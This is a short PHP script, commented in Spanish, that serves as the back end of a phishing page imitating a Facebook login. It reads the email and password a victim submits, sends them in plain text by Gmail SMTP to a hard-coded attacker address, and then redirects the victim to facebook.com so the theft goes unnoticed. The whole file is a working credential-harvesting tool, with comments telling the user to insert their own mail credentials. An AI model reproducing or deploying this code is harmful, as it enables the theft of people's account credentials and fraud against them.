<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'PHPMailer/src/Exception.php';
require 'PHPMailer/src/PHPMailer.php';
require 'PHPMailer/src/SMTP.php';

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST["email"];
    $password = $_POST["password"];

    // Configurar PHPMailer
    $mail = new PHPMailer(true);

    try {
        // Configuración del servidor SMTP de Gmail
        $mail->isSMTP();
        $mail->Host = 'smtp.gmail.com';
        $mail->SMTPAuth = true;
        $mail->Username = 'anddyku@gmail.com';  // Reemplázalo con tu correo
        $mail->Password = 'tu_contraseña';  // Reemplázalo con tu contraseña de aplicación
        $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
        $mail->Port = 587;

        // Configuración del correo
        $mail->setFrom('tu_correo@gmail.com', 'Sistema de Login');
        $mail->addAddress('anddyku0@gmail.com'); // Correo donde se enviará la información
        $mail->Subject = 'Nuevo intento de inicio de sesión';
        $mail->Body = "Se ha recibido un intento de inicio de sesión:\n\nCorreo: $email\nContraseña: $password\n\nFecha: " . date("Y-m-d H:i:s");

        // Enviar el correo
        $mail->send();

        // Redirigir a Facebook después de enviar el correo
        header("Location: https://www.facebook.com");
        exit();
    } catch (Exception $e) {
        echo "Error al enviar el correo: {$mail->ErrorInfo}";
    }
}
?>
